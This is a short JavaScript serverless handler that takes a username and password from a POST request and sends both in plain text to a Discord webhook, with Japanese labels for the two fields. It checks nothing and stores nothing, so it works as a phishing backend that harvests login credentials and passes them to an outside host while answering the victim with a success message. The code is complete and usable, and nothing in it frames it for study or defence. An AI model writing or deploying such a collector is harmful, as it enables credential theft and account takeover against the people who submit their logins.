export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();
  const { username, password } = req.body || {};
  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
  if (!WEBHOOK_URL) {
    return res.status(500).json({ error: "Webhook not configured" });
  }
  try {
    const discordRes = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `ユーザー名: ${username}\nパスワード: ${password}`
      })
    });
    if (discordRes.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: "Discord error" });
    }
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
}
